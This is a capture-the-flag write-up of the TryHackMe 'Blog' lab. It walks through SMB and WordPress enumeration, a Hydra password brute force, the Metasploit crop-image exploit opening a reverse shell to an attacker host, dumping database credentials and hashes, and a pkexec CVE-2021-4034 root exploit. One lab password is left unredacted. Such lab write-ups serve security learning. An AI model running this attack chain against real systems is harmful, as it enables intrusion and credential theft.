---
title: "Blog"
date: 2025-03-23 
image: /assets/img/tryhackme/Blog/Blog_image.jpg
description: Writeup of the TryHackMe-CTF Blog
categories: [TryHackMe, Medium]
tags: [linux, wordpress, pkexec]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Blog</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Billy Joel made a Wordpress blog!</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/blog">https://tryhackme.com/room/blog</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Blog.  

## Enumeration
I started the enumeration using `nmap`:
```bash
kali@kali:~/ctf/blog$ nmap -p- 10.10.194.182        
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-22 05:37 EDT
  Nmap scan report for 10.10.194.182
  Host is up (0.039s latency).
  Not shown: 65531 closed tcp ports (conn-refused)
  PORT    STATE SERVICE
  22/tcp  open  ssh
  80/tcp  open  http
  139/tcp open  netbios-ssn
  445/tcp open  microsoft-ds

  Nmap done: 1 IP address (1 host up) scanned in 21.15 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
kali@kali:~/ctf/blog$ nmap -A -p 22,80,139,445 10.10.194.182
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-22 05:38 EDT
  Nmap scan report for 10.10.194.182
  Host is up (0.041s latency).

  PORT    STATE SERVICE     VERSION
  22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
  |   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
  |_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
  80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
  |_http-generator: WordPress 5.0
  | http-robots.txt: 1 disallowed entry 
  |_/wp-admin/
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
  139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
  Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Host script results:
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  | smb2-time: 
  |   date: 2025-03-22T09:38:45
  |_  start_date: N/A
  |_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  | smb-os-discovery: 
  |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
  |   Computer name: blog
  |   NetBIOS computer name: BLOG\x00
  |   Domain name: \x00
  |   FQDN: blog
  |_  System time: 2025-03-22T09:38:45+00:00
  |_clock-skew: mean: -8s, deviation: 0s, median: -9s
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 21.32 seconds
```
From here I proceeded the analysis port by port.

## Port 139 & 445 Analysis

I began by analyzing the SMB share using `enum4linux`, which revealed a share named `BillySMB`:
```bash
kali@kali:~/ctf/blog$ enum4linux blog.thm`
[...]
Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
[...]
//blog.thm/BillySMB     Mapping: OK Listing: OK Writing: N/A
```

I successfully connected to share and download all the files using `smbclient`:
```bash
kali@kali:~/ctf/blog$ smbclient  -N \\\\blog.thm\\BillySMB          
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 14:17:05 2020
  ..                                  D        0  Tue May 26 13:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020
```

I managed to extract some hidden information from the JPG file, but it wasn't useful:
```bash
kali@kali:~/ctf/blog$ steghide --extract -sf Alice-White-Rabbit.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                          
kali@kali:~/ctf/blog$ cat rabbit_hole.txt                          
You've found yourself in a rabbit hole, friend.
```

The PNG file contained a QR code that linked to this <a href="https://www.youtube.com/watch?v=eFTLKWw542g">YouTube</a> video.

Lastly, I analyzed the MP4 video, but didn't find anything noteworthy, though it was fun to watch.

## Port 80 Analysis

Next, I added `blog.thm` to my hosts file and accessed the website. To enumerate the website, I started a Gobuster directory scan:
```bash
kali@kali:~/ctf/blog$ gobuster dir --url http://blog.thm/ --wordlist /usr/share/wordlists/dirb/common.txt -x txt,html,php
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://blog.thm/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                common.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,html,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.html                (Status: 403) [Size: 278]
  /.php                 (Status: 403) [Size: 278]
  /.hta                 (Status: 403) [Size: 278]
  /.hta.txt             (Status: 403) [Size: 278]
  /.hta.html            (Status: 403) [Size: 278]
  /.hta.php             (Status: 403) [Size: 278]
  /.htaccess.txt        (Status: 403) [Size: 278]
  /.htaccess            (Status: 403) [Size: 278]
  /.htaccess.php        (Status: 403) [Size: 278]
  /.htaccess.html       (Status: 403) [Size: 278]
  /.htpasswd            (Status: 403) [Size: 278]
  /.htpasswd.txt        (Status: 403) [Size: 278]
  /.htpasswd.php        (Status: 403) [Size: 278]
  /.htpasswd.html       (Status: 403) [Size: 278]
  /0                    (Status: 301) [Size: 0] [--> http://10.10.194.182/0/]
  /admin                (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
  /atom                 (Status: 301) [Size: 0] [--> http://10.10.194.182/feed/atom/]
  /dashboard            (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
  /embed                (Status: 301) [Size: 0] [--> http://10.10.194.182/embed/]
  /favicon.ico          (Status: 200) [Size: 0]
  /feed                 (Status: 301) [Size: 0] [--> http://10.10.194.182/feed/]
  /xmlrpc.php           (Status: 405) [Size: 42]
  /xmlrpc.php           (Status: 405) [Size: 42]
  /wp-settings.php      (Status: 500) [Size: 0]
  /wp-signup.php        (Status: 302) [Size: 0] [--> http://blog.thm/wp-login.php?action=register]
  /wp-rss2.php          (Status: 301) [Size: 0] [--> http://blog.thm/feed/]
  /wp-rss.php           (Status: 301) [Size: 0] [--> http://blog.thm/feed/]
  /wp-register.php      (Status: 301) [Size: 0] [--> http://blog.thm/wp-login.php?action=register]
  /wp-rdf.php           (Status: 301) [Size: 0] [--> http://blog.thm/feed/rdf/]
  /wp-mail.php          (Status: 403) [Size: 2768]
  /wp-load.php          (Status: 200) [Size: 0]
  /wp-login.php         (Status: 200) [Size: 3087]
  /wp-links-opml.php    (Status: 200) [Size: 233]
  /wp-includes          (Status: 301) [Size: 310] [--> http://blog.thm/wp-includes/]
  /wp-feed.php          (Status: 301) [Size: 0] [--> http://blog.thm/feed/]
  /wp-cron.php          (Status: 200) [Size: 0]
  /wp-content           (Status: 301) [Size: 309] [--> http://blog.thm/wp-content/]
  /wp-config.php        (Status: 200) [Size: 0]
  /wp-commentsrss2.php  (Status: 301) [Size: 0] [--> http://blog.thm/comments/feed/]
  /wp-admin             (Status: 301) [Size: 307] [--> http://blog.thm/wp-admin/]
  /wp-app.php           (Status: 403) [Size: 0]
  /wp-atom.php          (Status: 301) [Size: 0] [--> http://blog.thm/feed/atom/]
  /welcome              (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
  /W                    (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
  /w                    (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
  /server-status        (Status: 403) [Size: 273]
```

After analyzing the output, I proceeded with WordPress enumeration.

### WordPress Analysis

Since a WordPress instance was present, I ran wpscan:
```bash
kali@kali:~/ctf/blog$ wpscan --url http://blog.thm/ --enumerate u
  _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
            \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
              \  /\  /  | |     ____) | (__| (_| | | | |
              \/  \/   |_|    |_____/ \___|\__,_|_| |_|

          WordPress Security Scanner by the WPScan Team
                          Version 3.8.25
        Sponsored by Automattic - https://automattic.com/
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
  _______________________________________________________________

  [+] URL: http://blog.thm/ [10.10.194.182]
  [+] Started: Sat Mar 22 06:36:15 2025

  Interesting Finding(s):

  [...]

  [+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
  | Found By: Rss Generator (Passive Detection)
  |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
  |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

  [+] WordPress theme in use: twentytwenty
  | Location: http://blog.thm/wp-content/themes/twentytwenty/
  | Last Updated: 2024-11-13T00:00:00.000Z
  | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
  | [!] The version is out of date, the latest version is 2.8
  | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
  | Style Name: Twenty Twenty
  | Style URI: https://wordpress.org/themes/twentytwenty/
  | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
  | Author: the WordPress team
  | Author URI: https://wordpress.org/
  |
  | Found By: Css Style In Homepage (Passive Detection)
  | Confirmed By: Css Style In 404 Page (Passive Detection)
  |
  | Version: 1.3 (80% confidence)
  | Found By: Style (Passive Detection)
  |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

  [i] User(s) Identified:

  [+] kwheel
  | Found By: Author Posts - Author Pattern (Passive Detection)
  | Confirmed By:
  |  Wp Json Api (Aggressive Detection)
  |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  |  Login Error Messages (Aggressive Detection)

  [+] bjoel
  | Found By: Author Posts - Author Pattern (Passive Detection)
  | Confirmed By:
  |  Wp Json Api (Aggressive Detection)
  |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  |  Login Error Messages (Aggressive Detection)

  [+] Karen Wheeler
  | Found By: Rss Generator (Passive Detection)
  | Confirmed By: Rss Generator (Aggressive Detection)

  [+] Billy Joel
  | Found By: Rss Generator (Passive Detection)
  | Confirmed By: Rss Generator (Aggressive Detection)

  [...]
```

The key results included the WordPress version number 5.0, the twentytwenty theme, and two users: `bjoel` and `kwheel` 

## Shell as www-data

I researched the WordPress version and found a `Crop-image Shell Upload` exploit in <a href="https://www.exploit-db.com/exploits/46662">Exploit-DB</a>. I loaded the module in Metasploit: 
```bash
msf6 > search wordpress crop

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
msf6 > use exploit/multi/http/wp_crop_rce
```

Since this was an authenticated RCE, I first needed valid credentials. Given that Karen Wheeler had published a post, it was likely she had write permissions. I initiated a brute-force attack using Hydra:
```bash
kali@kali:~/ctf/blog$ hydra -l 'kwheel' -P /usr/share/wordlists/rockyou.txt 10.10.194.182 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered"
  [...]
  [80][http-post-form] host: 10.10.194.182   login: kwheel   password: c[removed]1
  [...]
```

Great! With valid credentials, I set the required options in Metasploit and executed the exploit:
```bash
msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD c[removed]1
PASSWORD => cutepie1
msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS 10.10.20.207
RHOSTS => 10.10.20.207
msf6 exploit(multi/http/wp_crop_rce) > set LHOST tun0
LHOST => [attackerip]
msf6 exploit(multi/http/wp_crop_rce) > exploit

[*] Started reverse TCP handler on [attackerip]:4444 
[*] Authenticating with WordPress using kwheel:c[removed]1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39927 bytes) to 10.10.20.207
[*] Meterpreter session 1 opened ([attackerip]:4444 -> 10.10.20.207:37980) at 2025-03-22 07:25:22 -0400
[*] Attempting to clean up files...

meterpreter >
```

Once I had a Meterpreter reverse shell, I began enumerating the system and found an `user.txt` file: 
```bash
meterpreter > cat user.txt
You won't find what you're looking for here.

TRY HARDER
```

## Privilege Escalation bjoel

I looked for ways to escalate privileges and found the `wp-config.php` file, which contained the database credentials:
```bash
  // ** MySQL settings - You can get this info from your web host ** //
  /** The name of the database for WordPress */
  define('DB_NAME', 'blog');

  /** MySQL database username */
  define('DB_USER', 'wordpressuser');

  /** MySQL database password */
  define('DB_PASSWORD', 'L[removed]@');

  /** MySQL hostname */
  define('DB_HOST', 'localhost');
```

I was able to log in to the MySql database and retrieved the user hash of bjoel:
```bash
www-data@blog:/var/www/wordpress$ mysql -u wordpressuser -p
mysql> show databases;
  +--------------------+
  | Database           |
  +--------------------+
  | information_schema |
  | blog               |
  +--------------------+
mysql> show tables;
  +-----------------------+
  | Tables_in_blog        |
  +-----------------------+
  | wp_commentmeta        |
  | wp_comments           |
  | wp_links              |
  | wp_options            |
  | wp_postmeta           |
  | wp_posts              |
  | wp_term_relationships |
  | wp_term_taxonomy      |
  | wp_termmeta           |
  | wp_terms              |
  | wp_usermeta           |
  | wp_users              |
  +-----------------------+
mysql> select * from wp_users;
  +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
  | ID | user_login | user_pass                          | user_nicename | user_email                   | user_url | user_registered     | user_activation_key | user_status | display_name  |
  +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
  |  1 | bjoel      | $P$[removed]                       | bjoel         | nconkl1@outlook.com          |          | 2020-05-26 03:52:26 |                     |           0 | Billy Joel    |
  |  3 | kwheel     | $P$[removed]                       | kwheel        | zlbiydwrtfjhmuuymk@ttirv.net |          | 2020-05-26 03:57:39 |                     |           0 | Karen Wheeler |
  +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
```

I attempted to crack it using `john`, but was unsuccessful with `rockyou.txt`:
```bash
kali@kali:~/ctf/blog$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 512/512 AVX512BW 16x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:21 DONE (2025-03-22 07:39) 0g/s 175061p/s 175061c/s 175061C/s !!n0t.@n0th3r.d@mn.p@$$w0rd!!..*7¡Vamos!
Session completed.
```

I tried to check if the user reused the password, but that was unsuccessful as well.

## Privilege Escalation root

I then checked for SUID bits and discoverd that `pkexec` had its SUID bit set. I used the exploit described in CVE-2021-4034 and successfully gained root access:
```bash
www-data@blog:/var/www/wordpress$ find / -perm /4000 -type f 2>/dev/null
  [...]
  /usr/bin/pkexec
  [...]
www-data@blog:/var/www/wordpress$ python3 exploit.py 
  Do you want to choose a custom payload? y/n (n use default payload)  n
  [+] Cleaning pervious exploiting attempt (if exist)
  [+] Creating shared library for exploit code.
  [+] Finding a libc library to call execve
  [+] Found a library at <CDLL 'libc.so.6', handle 7ff8c433a000 at 0x7ff8c41c3ba8>
  [+] Call execve() with chosen payload
  [+] Enjoy your root shell
# whoami
  root
# cat /root/root.txt
  9[removed]8
# find / -name user.txt 2>/dev/null
  /home/bjoel/user.txt
  /media/usb/user.txt
# cat /media/usb/user.txt
  c[removed]7
```

solved! :)